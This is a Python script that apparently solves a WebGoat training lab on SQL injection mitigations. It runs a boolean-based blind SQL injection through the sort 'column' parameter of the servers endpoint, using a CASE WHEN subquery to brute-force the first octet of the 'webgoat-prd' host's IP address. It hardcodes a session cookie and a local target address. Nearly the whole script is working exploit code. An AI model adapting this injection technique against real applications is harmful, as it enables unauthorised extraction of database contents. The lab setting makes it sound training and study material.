import json  
import requests  
  
def sql_injection_mitigation_10(HOST, PORT, COOKIE):  
     headers = {  
        'Cookie': COOKIE,  
     }
     ip_first = 1
     while True: 
         # column=(case+when+(select+substr(ip,1,1)='0'+from+servers+where+hostname='webgoat-prd')+then+hostname+else+mac+end)
         r = requests.get("http://" + HOST + ":" + PORT + "/WebGoat/SqlInjectionMitigations/servers?column=(CASE WHEN (select ip from servers where hostname='webgoat-prd')='" + str(ip_first) + ".130.219.202' THEN id ELSE hostname END)", headers=headers)  
  
         try:  
             response = json.loads(r.text)  
             #print(response)
         except:  
             print("Wrong JSESSIONID, find it by looking at your requests once logged in.")  
             return  
  
         if response[0]['id'] == '1':
             print('webgoat-prd IP: {}.130.219.202'.format(ip_first))
             return  
         else:  
             ip_first += 1
             if ip_first > 255:
                 print('Not Found!')
                 return
  
if __name__ == "__main__":
    sql_injection_mitigation_10("192.168.0.123", "8080", "JSESSIONID=5UrbAfBzaEKzIatmk5Q6xppmcTeZmdpxg6qsP4qN")